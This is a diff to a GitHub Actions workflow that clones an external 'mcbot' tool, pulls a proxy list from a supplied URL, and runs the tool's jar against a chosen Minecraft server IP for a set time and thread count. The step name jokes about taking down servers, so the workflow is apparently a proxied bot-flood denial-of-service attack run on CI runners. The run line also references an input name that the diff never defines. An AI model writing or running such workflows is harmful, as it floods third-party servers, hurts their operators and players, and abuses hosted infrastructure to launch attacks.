@@ -33,6 +33,16 @@ on:
         required: true
         default: '340'
         type: string
+      seconds:
+        description: 'seconds for mcbot'
+        required: true
+        default: '200'
+        type: string
+      threads:
+        description: 'threads for mcbot'
+        required: true
+        default: '-1'
+        type: string
 
 jobs:
   build:
@@ -40,16 +50,18 @@ jobs:
 
     steps:
       - uses: actions/checkout@v3
-      - name: Run a multi-line script
+      - name: Run mcbot with github actions. ggs if server doesnt have bungee lol:)
         run: |
           git clone https://github.com/nejason57mars/mcbot.git
           cd mcbot
           rm -rf proxies.txt
           wget ${{ github.event.inputs.site_proxies_value}}
           mv socks4.txt proxies.txt
-          java -jar MCBOT.jar ${{ github.event.inputs.server_ip_value }} ${{ github.event.inputs.minecraft_protocol_value}} ${{ github.event.inputs.mcbot_method_value }} 500 -1
+          java -jar MCBOT.jar ${{ github.event.inputs.server_ip_value }} ${{ github.event.inputs.minecraft_protocol_value}} ${{ github.event.inputs.mcbot_method_value }} ${{ github.event.inputs.minecraft_seconds}} ${{ github.event.inputs.threads}}
     env:
       SERVER_IP_TEST: ${{ github.event.inputs.server_ip_value }}
       MCBOT_METHOD_VALUE: ${{ github.event.inputs.mcbot_method_value }}
       SITE_PROXIES: ${{ github.event.inputs.site_proxies_value}}
       minecraft_protocol_value: ${{ github.event.inputs.minecraft_protocol_value}}
+      seconds: ${{ github.event.inputs.seconds}}
+      threads: ${{ github.event.inputs.threads}}
